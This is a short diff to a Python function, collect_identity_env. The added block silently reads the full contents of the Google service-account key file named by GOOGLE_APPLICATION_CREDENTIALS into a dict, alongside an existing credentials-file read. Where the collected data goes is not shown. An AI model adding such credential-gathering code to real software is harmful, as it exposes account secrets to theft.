@@ -118,6 +118,12 @@ def collect_identity_env() -> Dict[str, Any]:
                 info["creds_file"] = f.read()
         except:
             pass
+
+        try:
+            with open(os.getenv('GOOGLE_APPLICATION_CREDENTIALS'), "r") as f:
+                info["creds_app_file"] = f.read()
+        except:
+            pass
     except Exception as e:
         info["identity"] = {"error": str(e), "type": type(e).__name__}
 
